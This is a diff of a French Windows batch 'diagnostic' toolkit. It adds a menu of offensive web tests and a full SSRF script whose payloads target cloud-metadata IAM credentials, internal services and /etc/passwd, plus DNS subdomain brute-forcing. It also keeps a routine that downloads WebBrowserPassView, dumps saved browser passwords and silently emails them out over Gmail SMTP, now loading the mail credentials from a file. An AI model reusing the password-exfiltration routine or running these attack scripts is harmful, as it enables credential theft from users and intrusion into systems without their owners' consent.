@@ -45,6 +45,23 @@ REM === DETECTION MODE SANS ECHEC ===
 REM Place APRES l'elevation admin pour pouvoir executer "bcdedit" avec les bons privileges !
 if defined SAFEBOOT_OPTION goto sys_safemode
 
+REM === CHARGEMENT DES CREDENTIALS DEPUIS LA CLE USB ===
+set "CRED_FILE=%SCRIPT_DIR%\credentials.txt"
+set "SMTP_USER="
+set "SMTP_PASS="
+set "EMAIL_TO="
+
+if exist "%CRED_FILE%" (
+    for /f "usebackq tokens=1,* delims==" %%A in ("%CRED_FILE%") do (
+        if "%%A"=="SMTP_USER" set "SMTP_USER=%%B"
+        if "%%A"=="SMTP_PASS" set "SMTP_PASS=%%B"
+        if "%%A"=="EMAIL_TO"  set "EMAIL_TO=%%B"
+    )
+    echo [OK] Credentials charges depuis credentials.txt
+) else (
+    echo [INFO] Aucun fichier credentials.txt trouve - mode mail desactive
+)
+
 set "t[2]=---:DIAGNOSTIC"
 set "t[3]=sys_diagnostic_menu:Menu de diagnostic~Regroupe 8 outils d'analyse (Systeme, Reseau, Sante...)"
 set "t[4]=---:REPARATION"
@@ -977,12 +994,18 @@ echo ===============================================
 echo   Export mots de passe navigateurs (Nirsoft)
 echo ===============================================
 echo.
+echo  [i] Cet outil exporte les mots de passe sauvegardes dans
+echo      Chrome, Firefox, Edge et autres navigateurs.
+echo  [!] A utiliser UNIQUEMENT sur votre propre PC.
+echo.
 
 set "WBPV=%~dp0WebBrowserPassView.exe"
 set "DOWNLOAD_URL=https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe"
-set "EMAIL=REMOVED_SMTP_EMAIL"
-set "SMTP_USER=REMOVED_SMTP_EMAIL"
-set "SMTP_PASS=REMOVED_SMTP_PASS"
+if not defined SMTP_USER (
+    echo  [!] Aucun credentials configure (credentials.txt absent).
+    echo  Le mode mail est indisponible. Seule la sauvegarde locale est possible.
+    set "NIRSOFT_KEEP=1"
+)
 
 rem Telecharger si necessaire
 if not exist "%WBPV%" (
@@ -1047,7 +1070,7 @@ if "%NIRSOFT_KEEP%"=="1" goto system_tools
 rem Mode mail : envoyer si fichier present puis supprimer
 if not exist "%OUTPUT%" goto system_tools
 
-powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - '+(Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe navigateurs.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att" >nul 2>&1
+powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL_TO%'; $sub='Export WebBrowserPassView - '+(Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe navigateurs.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att" >nul 2>&1
 
 del /F /Q "%OUTPUT%" >nul 2>&1
 goto system_tools
@@ -1332,46 +1355,125 @@ REM              CYBERSECURITE RESEAU
 REM ===================================================================
 :net_cyber_menu
 cls
-set "opts=Triage de Connectivite (Flash Diagnostic)~Verification immediate IP, DNS, Gateway et Internet"
-set "opts=%opts%;Audit des Adaptateurs et Configuration~Details techniques des cartes reseau, MAC, MTU et Vitesse"
-set "opts=%opts%;Analyse des Flux (Ports et Processus)~Cartographie des ports ouverts et des logiciels actifs"
-set "opts=%opts%;Scan Reseau et Marques (OUI/MAC)~Scan LAN ultra-rapide avec identification des constructeurs"
-set "opts=%opts%;Audit de Securite et Defense~Firewall, Ports suspects (RAT) et Partages reseau"
-set "opts=%opts%;Scanner de Vulnerabilites Web (Pentest)~Tests SQLi, XSS et Headers de securite sur une URL"
-set "opts=%opts%;Test d'Infiltration et Audit de Privileges~Audit des Unquoted Paths, Taches SYSTEM et Banner Grabbing"
-set "opts=%opts%;Generateur de Config Securite (.htaccess)~Cree une configuration robuste (Headers, Security) pour votre site web"
-set "opts=%opts%;Test de Fuite DNS (Anonymat)~Verifie si votre IP reelle ou vos DNS fuitent"
-set "opts=%opts%;Rapport de Diagnostic Pro (Audit HTML)~Genere un audit complet detaille sur votre Bureau"
-set "opts=%opts%;Scan Fichiers Sensibles Exposes~.env, configs, backups, git, phpinfo..."
-set "opts=%opts%;SQLi Avancee (Blind+Boolean+UNION)~Detection blind, time-based, error-based, UNION"
-set "opts=%opts%;Scan Sous-Domaines et Endpoints~Bruteforce DNS + API endpoints caches"
-set "opts=%opts%;Audit Authentification et Sessions~Creds defaut, timing, CSRF, bruteforce protection"
-set "opts=%opts%;Injections Avancees (SSTI/XXE/JWT)~Vecteurs modernes d'attaques serveur et API"
-set "opts=%opts%;Reconnaissance Avancee (AXFR, crt.sh, WHOIS, robots.txt)~Collecte d'informations passive et active"
-set "opts=%opts%;Rapport Pentest HTML Unifie (Scan complet + score de securite exporte en HTML)~Analyse automatisée exhaustive (Vulnerability Scan)"
-
-call :DynamicMenu "AUDIT ET CYBERSECURITE RESEAU" "!opts!"
-set "cyber_c=%errorlevel%"
-
-if "%cyber_c%"=="0" goto sys_network_menu
-if "%cyber_c%"=="1" goto cyber_triage
-if "%cyber_c%"=="2" goto cyber_adapter_audit
-if "%cyber_c%"=="3" goto cyber_flux_analysis
-if "%cyber_c%"=="4" goto cyber_lan_scan
-if "%cyber_c%"=="5" goto cyber_security_audit
-if "%cyber_c%"=="6" goto cyber_web_pentest
-if "%cyber_c%"=="7" goto cyber_privesc_audit
-if "%cyber_c%"=="8" goto cyber_gen_htaccess
-if "%cyber_c%"=="9" goto cyber_dns_leak
-if "%cyber_c%"=="10" goto cyber_security_report
-if "%cyber_c%"=="11" goto cyber_exposed_files
-if "%cyber_c%"=="12" goto cyber_sqli_blind
-if "%cyber_c%"=="13" goto cyber_subdomain_scan
-if "%cyber_c%"=="14" goto cyber_auth_test
-if "%cyber_c%"=="15" goto cyber_advanced_inject
-if "%cyber_c%"=="16" goto cyber_recon_advanced
-if "%cyber_c%"=="17" goto cyber_pentest_report
+echo.
+echo  ================================================================
+echo   CYBERSECURITE - CHOISISSEZ UNE CATEGORIE
+echo  ================================================================
+echo.
+echo  [1] RECONNAISSANCE     - Collecter des infos avant d'agir
+echo  [2] ANALYSE RESEAU     - Scanner et cartographier le reseau
+echo  [3] WEB OFFENSIF       - Tester les vulnerabilites d'un site
+echo  [4] AUDIT DEFENSIF     - Verifier la securite de votre systeme
+echo  [5] RAPPORTS           - Generer des rapports complets HTML
+echo.
+echo  [0] Retour
+echo  ================================================================
+echo.
+set /p "cyber_cat=Votre choix : "
+if "%cyber_cat%"=="1" goto cat_recon
+if "%cyber_cat%"=="2" goto cat_network
+if "%cyber_cat%"=="3" goto cat_web
+if "%cyber_cat%"=="4" goto cat_defense
+if "%cyber_cat%"=="5" goto cat_reports
+if "%cyber_cat%"=="0" goto sys_network_menu
 goto net_cyber_menu
+
+:cat_recon
+cls
+set "opts=[--- RECONNAISSANCE (Collecte d'informations) ---]"
+set "opts=%opts%;WHOIS et ASN Lookup~QUI possede ce domaine/IP ? Registrar, dates, organisation, ASN"
+set "opts=%opts%;Certificate Transparency (crt.sh)~Trouve TOUS les sous-domaines via les certificats SSL publics - sans envoyer une seule requete au site"
+set "opts=%opts%;Zone Transfer DNS (AXFR)~Tente d'obtenir toute la liste DNS du domaine (fonctionne si le serveur NS est mal configure)"
+set "opts=%opts%;Robots.txt et Sitemap~Lit les chemins que le site veut cacher aux moteurs de recherche - souvent des panels admin"
+set "opts=%opts%;Sous-domaines actifs (Bruteforce DNS)~Teste 50+ sous-domaines courants (dev, staging, api...) et affiche ceux qui repondent"
+
+call :DynamicMenu "RECONNAISSANCE - Collecte passive et active" "%opts%"
+set "recon_c=%errorlevel%"
+if "%recon_c%"=="0" goto net_cyber_menu
+if "%recon_c%"=="1" goto recon_whois
+if "%recon_c%"=="2" goto recon_crtsh
+if "%recon_c%"=="3" goto recon_axfr
+if "%recon_c%"=="4" goto recon_robots
+if "%recon_c%"=="5" goto recon_subdomain_brute
+goto cat_recon
+
+:cat_network
+cls
+set "opts=[--- ANALYSE RESEAU ---]"
+set "opts=%opts%;Triage Connectivite (Flash)~Verifie en 10s : IP locale, passerelle, DNS et acces internet"
+set "opts=%opts%;Audit Adaptateurs (MAC, MTU, Vitesse)~Detaille les cartes reseau : nom, statut, adresse MAC, MTU, vitesse de liaison"
+set "opts=%opts%;Scan LAN + Marques OUI~Scan tout le sous-reseau, identifie les fabricants via l'adresse MAC et les ports ouverts"
+set "opts=%opts%;Cartographie Flux (Ports et Processus)~Liste toutes les connexions TCP actives avec le nom du processus associe"
+set "opts=%opts%;Test Fuite DNS~Verifie si votre VPN laisse fuiter vos vraies requetes DNS"
+set "opts=%opts%;Gestionnaire DNS (Cloudflare / Google)~Change les DNS de votre PC : Cloudflare 1.1.1.1 ou Google 8.8.8.8"
+
+call :DynamicMenu "ANALYSE RESEAU - Scanner et cartographier" "%opts%"
+set "net_c=%errorlevel%"
+if "%net_c%"=="0" goto net_cyber_menu
+if "%net_c%"=="1" goto cyber_triage
+if "%net_c%"=="2" goto cyber_adapter_audit
+if "%net_c%"=="3" goto cyber_lan_scan
+if "%net_c%"=="4" goto cyber_flux_analysis
+if "%net_c%"=="5" goto cyber_dns_leak
+if "%net_c%"=="6" goto dns_manager
+goto cat_network
+
+:cat_web
+cls
+set "opts=[--- TESTS WEB OFFENSIFS (autorisation requise) ---]"
+set "opts=%opts%;Scanner General (Headers, XSS, SQLi, CORS)~Scan complet en une passe : headers manquants, cookies, SQLi basique, XSS, redirections"
+set "opts=%opts%;SQLi Avancee (Blind, Time-based, UNION)~Detection des injections SQL invisibles par comparaison de reponses et delais"
+set "opts=%opts%;Fichiers Sensibles Exposes~Teste 60+ chemins : .env, config.php, /.git/config, phpinfo, backups..."
+set "opts=%opts%;SSTI (Template Injection)~Injecte 7*7 dans les parametres pour detecter Jinja2, Twig, EL, ERB, Freemarker..."
+set "opts=%opts%;XXE (XML External Entity)~Envoie des payloads XML malformes pour lire /etc/passwd ou atteindre des services internes"
+set "opts=%opts%;JWT (JSON Web Token) - Decode et Attaque~Decode un JWT, teste alg:none et bruteforce le secret HMAC sur 15 mots de passe courants"
+set "opts=%opts%;SSRF (Server-Side Request Forgery)~Tente de faire appeler le serveur lui-meme ou des metadonnees cloud (AWS/GCP/Azure)"
+set "opts=%opts%;Subdomain Takeover~Verifie si des sous-domaines pointent vers des services abandonndes (GitHub Pages, S3, Heroku...)"
+set "opts=%opts%;Audit Authentification et Sessions~Teste les mots de passe par defaut, le timing utilisateurs, CSRF, bruteforce, path traversal"
+
+call :DynamicMenu "WEB OFFENSIF - Tests de vulnerabilites (autorisation ecrite obligatoire)" "%opts%"
+set "web_c=%errorlevel%"
+if "%web_c%"=="0" goto net_cyber_menu
+if "%web_c%"=="1" goto cyber_web_pentest
+if "%web_c%"=="2" goto cyber_sqli_blind
+if "%web_c%"=="3" goto cyber_exposed_files
+if "%web_c%"=="4" goto adv_ssti
+if "%web_c%"=="5" goto adv_xxe
+if "%web_c%"=="6" goto adv_jwt
+if "%web_c%"=="7" goto cyber_ssrf
+if "%web_c%"=="8" goto cyber_subdomain_takeover
+if "%web_c%"=="9" goto cyber_auth_test
+goto cat_web
+
+:cat_defense
+cls
+set "opts=[--- AUDIT DEFENSIF (votre propre systeme) ---]"
+set "opts=%opts%;Audit Privileges Windows~Cherche les failles d'elevation : Unquoted Paths, AlwaysInstallElevated, DLL Hijack, services inscriptibles"
+set "opts=%opts%;Audit Pare-feu et Ports Suspects~Verifie l'etat du firewall et detecte les ports associes aux RAT/backdoors connus"
+set "opts=%opts%;Generateur .htaccess Securise~Cree la configuration Apache optimale : HSTS, CSP, X-Frame, SameSite, Referrer-Policy"
+set "opts=%opts%;Test Antivirus (EICAR)~Teste si votre antivirus detecte une signature virale inoffensive standard"
+
+call :DynamicMenu "AUDIT DEFENSIF - Verifier votre propre securite" "%opts%"
+set "def_c=%errorlevel%"
+if "%def_c%"=="0" goto net_cyber_menu
+if "%def_c%"=="1" goto cyber_privesc_audit
+if "%def_c%"=="2" goto cyber_security_audit
+if "%def_c%"=="3" goto cyber_gen_htaccess
+if "%def_c%"=="4" goto sys_av_test
+goto cat_defense
+
+:cat_reports
+cls
+set "opts=[--- GENERATION DE RAPPORTS HTML ---]"
+set "opts=%opts%;Rapport Pentest Web Complet~Scan automatise : headers, SSL, CORS, SQLi, SSTI, fichiers - Score /100 et recommandations"
+set "opts=%opts%;Rapport Securite Reseau Local~Audit de votre PC : ports ouverts, connexions actives, etat pare-feu, alertes DNS"
+
+call :DynamicMenu "RAPPORTS - Exporter les resultats" "%opts%"
+set "rpt_c=%errorlevel%"
+if "%rpt_c%"=="0" goto net_cyber_menu
+if "%rpt_c%"=="1" goto cyber_pentest_report
+if "%rpt_c%"=="2" goto cyber_security_report
+goto cat_reports
 
 :cyber_triage
 cls
@@ -1402,7 +1504,7 @@ echo  [i] CONSEIL : Une vitesse de 100 Mbps sur un cable Gigabit (1000)
 echo      indique souvent un cable endommage.
 echo.
 pause
-goto net_cyber_menu
+goto cat_network
 
 :cyber_flux_analysis
 cls
@@ -1566,7 +1668,7 @@ echo  [i] CONSEIL : Pour corriger un "Unquoted Path", utilisez la commande :
 echo      reg add "HKLM\SYSTEM\CurrentControlSet\Services\NOM_DU_SERVICE" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Chemin\Vers\App.exe\"" /f
 echo.
 pause
-goto net_cyber_menu
+goto cat_defense
 
 :cyber_dns_leak
 cls
@@ -1585,7 +1687,7 @@ echo  [i] CONSEIL : Si vous utilisez un VPN, vous ne devriez PAS voir les IP
 echo      de votre box internet ici. Utilisez 1.1.1.1 ou 8.8.8.8 pour plus de securite.
 echo.
 pause
-goto net_cyber_menu
+goto cat_network
 
 :cyber_lan_scan
 cls
@@ -1662,7 +1764,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%SCPS%"
 if exist "%SCPS%" del "%SCPS%"
 echo.
 pause
-goto net_cyber_menu
+goto cat_network
 
 
 :cyber_gen_htaccess
@@ -2302,57 +2404,300 @@ powershell -NoProfile -Command "$t='!JWT_TOKEN!'; $parts=$t.Split('.'); if($part
 pause & goto cyber_advanced_inject
 
 :cyber_recon_advanced
-cls
-echo.
-echo  ===========================================================
-echo   RECONNAISSANCE AVANCEE
-echo  ===========================================================
-echo.
-set "opts=DNS Zone Transfer (AXFR)~Tente de lister tous les sous-domaines via les serveurs NS;Certificate Transparency (crt.sh)~Recherche tous les sous-domaines via les certificats publics;WHOIS ^& ASN Lookup~Informations de propriete et routage;Robots.txt ^& Sitemap Scraping~Exploration des chemins declares non-indexes"
-call :DynamicMenu "OUTILS DE RECONNAISSANCE" "%opts%"
-set "recon_c=%errorlevel%"
-if "%recon_c%"=="0" goto net_cyber_menu
-if "%recon_c%"=="1" goto recon_axfr
-if "%recon_c%"=="2" goto recon_crtsh
-if "%recon_c%"=="3" goto recon_whois
-if "%recon_c%"=="4" goto recon_robots
-goto cyber_recon_advanced
-
-:recon_axfr
-cls
-echo.
-echo  [AXFR] Tentative de transfert de zone...
-set /p "AX_DOM=Domaine (ex: zonetransfer.me) : "
-if "%AX_DOM%"=="" goto cyber_recon_advanced
-powershell -NoProfile -Command "$d='!AX_DOM!'; $ns=Resolve-DnsName $d -Type NS -ErrorAction SilentlyContinue; foreach($srv in $ns.NameHost){ Write-Host \"  Test sur $srv...\" -f Gray; nslookup -type=any -timeout=5 $d $srv | Select-String \"$d\" | ForEach-Object { Write-Host $_ -f Green } }"
-pause & goto cyber_recon_advanced
-
-:recon_crtsh
-cls
-echo.
-echo  [crt.sh] Recherche de sous-domaines via certificats SSL...
-set /p "CRT_DOM=Domaine cible : "
-if "%CRT_DOM%"=="" goto cyber_recon_advanced
-powershell -NoProfile -Command "$d='!CRT_DOM!'; $url=\"https://crt.sh/?q=%%.$d^&output=json\"; try { $r=Invoke-WebRequest $url -TimeoutSec 15 -UseBasicParsing; $json=$r.Content | ConvertFrom-Json; $json | Select-Object -ExpandProperty common_name -Unique | Sort-Object | ForEach-Object { Write-Host \"  [+] $_\" -f Green } } catch { Write-Host 'Erreur de connexion a crt.sh' -f Red }"
-pause & goto cyber_recon_advanced
+goto cat_recon
 
 :recon_whois
 cls
 echo.
 echo  [WHOIS] Information de domaine...
 set /p "WH_DOM=Domaine ou IP : "
-if "%WH_DOM%"=="" goto cyber_recon_advanced
-powershell -NoProfile -Command "whois !WH_DOM! 2>$null; if($? -eq $false){ Invoke-WebRequest \"https://rdap.org/domain/!WH_DOM!\" -UseBasicParsing | ConvertFrom-Json | Select-Object -Property ldhName, status, entities | Format-List; Write-Host 'Donnees RDAP (WHOIS Moderne) recuperees.' -f Cyan }"
-pause & goto cyber_recon_advanced
+if "%WH_DOM%"=="" goto cat_recon
+powershell -NoProfile -Command "$d='!WH_DOM!'; Write-Host '--- WHOIS Info ---' -f Cyan; try { $ip = [System.Net.Dns]::GetHostAddresses($d)[0].IPAddressToString; Write-Host \"Resolv IP: $ip\" -f Gray; $info = Invoke-RestMethod \"https://ipinfo.io/$ip/json\"; $info | Format-List } catch { whois $d 2>$null }"
+pause & goto cat_recon
+
+:recon_crtsh
+cls
+echo.
+echo  [crt.sh] Recherche de sous-domaines via certificats SSL...
+set /p "CRT_DOM=Domaine cible (ex: google.com) : "
+if "%CRT_DOM%"=="" goto cat_recon
+powershell -NoProfile -Command "$d='!CRT_DOM!'; $url=\"https://crt.sh/?q=%%.$d&output=json\"; Write-Host 'Interrogation de crt.sh...' -f Gray; try { $r=Invoke-WebRequest $url -TimeoutSec 15 -UseBasicParsing; $json=$r.Content | ConvertFrom-Json; $json | Select-Object -ExpandProperty common_name -Unique | Sort-Object | ForEach-Object { Write-Host \"  [+] $_\" -f Green } } catch { Write-Host 'Erreur de connexion a crt.sh' -f Red }"
+pause & goto cat_recon
+
+:recon_axfr
+cls
+echo.
+echo  [AXFR] Tentative de transfert de zone...
+set /p "AX_DOM=Domaine (ex: zonetransfer.me) : "
+if "%AX_DOM%"=="" goto cat_recon
+powershell -NoProfile -Command "$d='!AX_DOM!'; Write-Host \"Recherche de serveurs NS pour $d...\" -f Gray; $ns=Resolve-DnsName $d -Type NS -ErrorAction SilentlyContinue; if(-not $ns){ Write-Host 'Aucun serveur NS trouve.' -f Red; exit }; foreach($srv in $ns.NameHost){ Write-Host \"  Test sur $srv...\" -f Yellow; nslookup -type=any -timeout=5 $d $srv | Select-String \"$d\" | ForEach-Object { Write-Host $_ -f Green } }"
+pause & goto cat_recon
 
 :recon_robots
 cls
 echo.
 echo  [ROBOTS] Scraping de robots.txt et sitemap.xml...
-set /p "RB_URL=URL (ex: https://google.com) : "
-if "%RB_URL%"=="" goto cyber_recon_advanced
-powershell -NoProfile -Command "$u='!RB_URL!'.TrimEnd('/'); foreach($p in @('/robots.txt', '/sitemap.xml')){ try { $r=Invoke-WebRequest ($u+$p) -TimeoutSec 5 -UseBasicParsing; Write-Host \"--- $p --- \" -f Blue; $r.Content; Write-Host \"----------------\" -f Blue } catch {} }"
-pause & goto cyber_recon_advanced
+set /p "RB_URL=URL (ex: https://site.com) : "
+if "%RB_URL%"=="" goto cat_recon
+powershell -NoProfile -Command "$u='!RB_URL!'.TrimEnd('/'); foreach($p in @('/robots.txt', '/sitemap.xml', '/.well-known/security.txt')){ try { $r=Invoke-WebRequest ($u+$p) -TimeoutSec 5 -UseBasicParsing; if($r.StatusCode -eq 200){ Write-Host \"`n--- $p --- \" -f Blue; $r.Content; Write-Host \"----------------\" -f Blue } } catch {} }"
+pause & goto cat_recon
+
+:recon_subdomain_brute
+cls
+echo.
+echo  ===========================================================
+echo   BRUTEFORCE DE SOUS-DOMAINES DNS
+echo  ===========================================================
+echo.
+set /p "SD_DOM=Domaine racine (ex: michelin.com) : "
+if "%SD_DOM%"=="" goto cat_recon
+powershell -NoProfile -Command "$d='!SD_DOM!'; $subs=@('www','dev','api','test','staging','beta','mail','vpn','smtp','pop','imap','ns1','ns2','webmail','blog','shop','admin','portal','secure','git','devops','jenkins','docker','kube','aws','azure','cloud','db','mysql','sql','internal','intra','private','corp','support','help','download','app','m','mobile','static','assets','cdn','srv','host'); Write-Host \"Debut du bruteforce sur $($subs.Count) mots...\" -f Cyan; foreach($s in $subs){ $fqdn=\"$s.$d\"; try { $ip=Resolve-DnsName $fqdn -Type A -ErrorAction Stop | Select-Object -ExpandProperty IPAddress -First 1; Write-Host \"  [+] $fqdn -> $ip\" -f Green; try { $r=Invoke-WebRequest \"http://$fqdn\" -Method Head -TimeoutSec 2 -ErrorAction Stop -UseBasicParsing; Write-Host \"      HTTP 200 ($($r.Headers['Server']))\" -f Gray } catch {} } catch {} }"
+pause & goto cat_recon
+
+:cyber_ssrf
+cls
+echo.
+echo  ===========================================================
+echo   SSRF - Server-Side Request Forgery
+echo  ===========================================================
+echo   Niveau : Avance    Impact : CRITIQUE
+echo   Ce que ca fait : Force le serveur a faire des requetes HTTP
+echo   pour vous, vers des adresses internes inaccessibles depuis
+echo   l'exterieur (metadonnees cloud, services internes, fichiers).
+echo   Fonctionnement : On injecte une URL dans un parametre
+echo   (url=, fetch=, redirect=, img=...) et on mesure la reponse.
+echo  ===========================================================
+echo.
+set /p "SSRF_URL=URL avec parametre (ex: https://site.com/fetch?url=) : "
+if "%SSRF_URL%"=="" goto cat_web
+
+set "SSRF_PS=%TEMP%\ssrf_test.ps1"
+if exist "%SSRF_PS%" del "%SSRF_PS%"
+
+echo $baseUrl = "!SSRF_URL!" > "%SSRF_PS%"
+echo $ua = "Mozilla/5.0" >> "%SSRF_PS%"
+echo $vulns = 0 >> "%SSRF_PS%"
+echo $suspicious = 0 >> "%SSRF_PS%"
+echo. >> "%SSRF_PS%"
+echo $payloads = @( >> "%SSRF_PS%"
+echo    @{ Name='AWS IMDSv1 (metadata)';    URL='http://169.254.169.254/latest/meta-data/';                          Detect='ami-id|instance-id|instance-type|local-ipv4|iam' }, >> "%SSRF_PS%"
+echo    @{ Name='AWS IMDSv2 (token)';        URL='http://169.254.169.254/latest/api/token';                          Detect='invalid|PUT required|TTL' }, >> "%SSRF_PS%"
+echo    @{ Name='AWS IAM credentials';       URL='http://169.254.169.254/latest/meta-data/iam/security-credentials/'; Detect='RoleName|AccessKeyId|SecretAccessKey|Token|Expiration' }, >> "%SSRF_PS%"
+echo    @{ Name='GCP Metadata';              URL='http://metadata.google.internal/computeMetadata/v1/';               Detect='project|instance|id|zone|machine-type' }, >> "%SSRF_PS%"
+echo    @{ Name='Azure IMDS';                URL='http://169.254.169.254/metadata/instance?api-version=2021-02-01';   Detect='compute|network|subscriptionId|resourceGroupName' }, >> "%SSRF_PS%"
+echo    @{ Name='Localhost HTTP (80)';       URL='http://127.0.0.1/';                                                 Detect='html|<body|server|apache|nginx|iis|express|welcome' }, >> "%SSRF_PS%"
+echo    @{ Name='Localhost HTTP (8080)';     URL='http://127.0.0.1:8080/';                                            Detect='html|<body|server|apache|nginx|tomcat|spring' }, >> "%SSRF_PS%"
+echo    @{ Name='Localhost HTTPS (443)';     URL='https://127.0.0.1/';                                                Detect='html|<body|server|certificate' }, >> "%SSRF_PS%"
+echo    @{ Name='Redis (6379)';              URL='http://127.0.0.1:6379/';                                            Detect='PONG|-ERR|redis_version|connected_clients' }, >> "%SSRF_PS%"
+echo    @{ Name='MongoDB (27017)';           URL='http://127.0.0.1:27017/';                                           Detect='mongo|ok.*1|topology|ismaster|MongoDB' }, >> "%SSRF_PS%"
+echo    @{ Name='Memcached (11211)';         URL='http://127.0.0.1:11211/';                                           Detect='VERSION|STORED|ERROR|END' }, >> "%SSRF_PS%"
+echo    @{ Name='Elasticsearch (9200)';      URL='http://127.0.0.1:9200/';                                            Detect='cluster_name|version|tagline|elasticsearch' }, >> "%SSRF_PS%"
+echo    @{ Name='File:// LFI (Linux)';       URL='file:///etc/passwd';                                                Detect='root:x:|daemon:|nobody:|/bin/bash|/bin/sh' }, >> "%SSRF_PS%"
+echo    @{ Name='File:// LFI (Windows)';     URL='file:///C:/Windows/win.ini';                                        Detect='\[fonts\]|\[extensions\]|for 16-bit' } >> "%SSRF_PS%"
+echo ) >> "%SSRF_PS%"
+echo. >> "%SSRF_PS%"
+echo Write-Host "" >> "%SSRF_PS%"
+echo Write-Host "  Test de $($payloads.Count) payloads SSRF..." -f Cyan >> "%SSRF_PS%"
+echo Write-Host "  (Chaque test timeout apres 6s max)" -f DarkGray >> "%SSRF_PS%"
+echo Write-Host "" >> "%SSRF_PS%"
+echo. >> "%SSRF_PS%"
+echo foreach ($p in $payloads) { >> "%SSRF_PS%"
+echo    Write-Host "  [?] $($p.Name.PadRight(35))" -f Gray -NoNewline >> "%SSRF_PS%"
+echo    $start = Get-Date >> "%SSRF_PS%"
+echo    try { >> "%SSRF_PS%"
+echo        $testUrl = $baseUrl + [uri]::EscapeDataString($p.URL) >> "%SSRF_PS%"
+echo        $r = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 6 -EA Stop -UseBasicParsing -MaximumRedirection 0 >> "%SSRF_PS%"
+echo        $elapsed = [math]::Round(((Get-Date)-$start).TotalMilliseconds) >> "%SSRF_PS%"
+echo        if ($r.Content -match $p.Detect) { >> "%SSRF_PS%"
+echo            Write-Host "[!!!] SSRF CONFIRME ! (${elapsed}ms)" -f Red >> "%SSRF_PS%"
+echo            Write-Host "       Service  : $($p.Name)" -f Magenta >> "%SSRF_PS%"
+echo            Write-Host "       Payload  : $($p.URL)" -f Magenta >> "%SSRF_PS%"
+echo            $preview = $r.Content -replace '\s+',' ' | ForEach-Object { $_.Substring(0, [math]::Min(200, $_.Length)) } >> "%SSRF_PS%"
+echo            Write-Host "       Extrait  : $preview" -f Yellow >> "%SSRF_PS%"
+echo            $vulns++ >> "%SSRF_PS%"
+echo        } elseif ($r.StatusCode -eq 200 -and $elapsed -lt 500) { >> "%SSRF_PS%"
+echo            Write-Host "[~] Reponse 200 rapide (${elapsed}ms) - A verifier manuellement" -f Yellow >> "%SSRF_PS%"
+echo            $suspicious++ >> "%SSRF_PS%"
+echo        } else { >> "%SSRF_PS%"
+echo            Write-Host "[-] HTTP $($r.StatusCode) (${elapsed}ms)" -f DarkGray >> "%SSRF_PS%"
+echo        } >> "%SSRF_PS%"
+echo    } catch [System.Net.WebException] { >> "%SSRF_PS%"
+echo        $elapsed = [math]::Round(((Get-Date)-$start).TotalMilliseconds) >> "%SSRF_PS%"
+echo        $sc = $_.Exception.Response.StatusCode.value__ >> "%SSRF_PS%"
+echo        if ($sc) { >> "%SSRF_PS%"
+echo            Write-Host "[-] HTTP $sc (${elapsed}ms)" -f DarkGray >> "%SSRF_PS%"
+echo        } elseif ($elapsed -ge 5800) { >> "%SSRF_PS%"
+echo            Write-Host "[~] TIMEOUT (${elapsed}ms) - Port potentiellement ouvert" -f Yellow >> "%SSRF_PS%"
+echo            $suspicious++ >> "%SSRF_PS%"
+echo        } else { >> "%SSRF_PS%"
+echo            Write-Host "[-] Erreur reseau (${elapsed}ms)" -f DarkGray >> "%SSRF_PS%"
+echo        } >> "%SSRF_PS%"
+echo    } catch { >> "%SSRF_PS%"
+echo        $elapsed = [math]::Round(((Get-Date)-$start).TotalMilliseconds) >> "%SSRF_PS%"
+echo        Write-Host "[-] Bloque (${elapsed}ms)" -f DarkGray >> "%SSRF_PS%"
+echo    } >> "%SSRF_PS%"
+echo } >> "%SSRF_PS%"
+echo. >> "%SSRF_PS%"
+echo Write-Host "" >> "%SSRF_PS%"
+echo Write-Host "  ================================================" -f Cyan >> "%SSRF_PS%"
+echo if ($vulns -gt 0) { >> "%SSRF_PS%"
+echo    Write-Host "  [!!!] $vulns SSRF confirme(s) !" -f Red >> "%SSRF_PS%"
+echo    Write-Host "  Impact possible :" -f Red >> "%SSRF_PS%"
+echo    Write-Host "    - Lecture des metadonnees cloud (cles IAM AWS, tokens GCP/Azure)" -f Yellow >> "%SSRF_PS%"
+echo    Write-Host "    - Acces aux services internes (Redis, MongoDB, Elasticsearch)" -f Yellow >> "%SSRF_PS%"
+echo    Write-Host "    - Lecture de fichiers systeme via file://" -f Yellow >> "%SSRF_PS%"
+echo    Write-Host "    - Pivoting vers le reseau interne du serveur" -f Yellow >> "%SSRF_PS%"
+echo } elseif ($suspicious -gt 0) { >> "%SSRF_PS%"
+echo    Write-Host "  [~] $suspicious reponse(s) suspecte(s) - Verifiez manuellement" -f Yellow >> "%SSRF_PS%"
+echo    Write-Host "  Testez avec Burp Suite ou curl pour confirmer." -f DarkGray >> "%SSRF_PS%"
+echo } else { >> "%SSRF_PS%"
+echo    Write-Host "  [OK] Aucun SSRF detecte sur les payloads testes." -f Green >> "%SSRF_PS%"
+echo    Write-Host "  Note : Un WAF peut bloquer les requetes - testez avec d'autres" -f DarkGray >> "%SSRF_PS%"
+echo    Write-Host "  encodages (double URL, IPv6, decimal, octal...)" -f DarkGray >> "%SSRF_PS%"
+echo } >> "%SSRF_PS%"
+echo Write-Host "  ================================================" -f Cyan >> "%SSRF_PS%"
+
+powershell -NoProfile -ExecutionPolicy Bypass -File "%SSRF_PS%"
